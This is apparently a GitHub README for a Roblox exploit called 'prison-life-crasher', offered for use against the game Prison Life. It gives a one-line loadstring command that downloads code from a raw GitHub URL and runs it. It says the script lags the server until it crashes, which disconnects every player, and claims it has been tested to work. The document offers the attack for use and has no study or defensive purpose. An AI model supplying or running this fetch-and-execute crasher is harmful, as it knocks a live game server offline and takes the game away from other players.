# prison-life-crasher
script to crash prison life, use this to execute:

```loadstring(game:HttpGet("https://raw.githubusercontent.com/sauce-boss01/prison-life-crasher/main/crasher", true))()```

also yes, this is indeed FE, i tested it in different devices and both crash.

this script lags the server until it crashes, so when you get disconnected everyone else also does.

No, this script dosent work on any other game since it uses prison life mechanics.
